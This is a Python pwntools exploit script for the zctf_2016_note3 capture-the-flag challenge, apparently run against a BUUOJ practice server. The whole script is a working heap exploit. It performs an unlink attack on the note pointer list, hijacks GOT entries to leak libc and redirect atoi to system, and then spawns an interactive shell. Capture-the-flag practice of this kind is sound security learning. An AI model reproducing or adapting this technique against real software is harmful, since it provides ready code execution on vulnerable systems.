from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('zctf_2016_note3')
io = remote('node4.buuoj.cn', 27185)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
elf = ELF('zctf_2016_note3')
ptr_list = 0x6020C8
puts_plt = elf.plt['puts']
free_got = elf.got['free']
atoi_got = elf.got['atoi']


def add(size, content):
    io.sendlineafter('option--->>\n', '1')
    io.sendlineafter('Input the length of the note content:(less than 1024)\n', str(size))
    io.sendlineafter('Input the note content:\n', content)


def edit(id, content):
    io.sendlineafter('option--->>\n', '3')
    io.sendlineafter('Input the id of the note:\n', str(id))
    io.sendlineafter('Input the new content:\n', content)


def delete(id):
    io.sendlineafter('option--->>\n', '4')
    io.sendlineafter('Input the id of the note:\n', str(id))

def unlink():
    add(0, '0')                     # chunk0
    add(0, '1')                     # chunk1
    add(0x80, '2')                  # chunk2
    fd, bk = ptr_list - 0x18, ptr_list - 0x10
    payload = p64(0) + p64(0x31) + p64(fd) + p64(bk) + cyclic(0x10) + p64(0x30) + p64(0x90)
    edit(0, payload)                # overwrite chunk2 prev_size size
    delete(2)


def pwn():
    payload = cyclic(0x18) + p64(free_got) + p64(atoi_got) * 2
    edit(0, payload)
    edit(0, p64(puts_plt)[:-1])
    delete(1)
    libc_base = u64(io.recvn(6).ljust(8, b'\x00')) - libc.sym['atoi']
    log.success('libc_base: ' + hex(libc_base))
    system = libc_base + libc.sym['system']
    edit(2, p64(system))
    io.sendlineafter('option--->>\n', '/bin/sh')
    io.interactive()


if __name__ == '__main__':
    unlink()
    pwn()
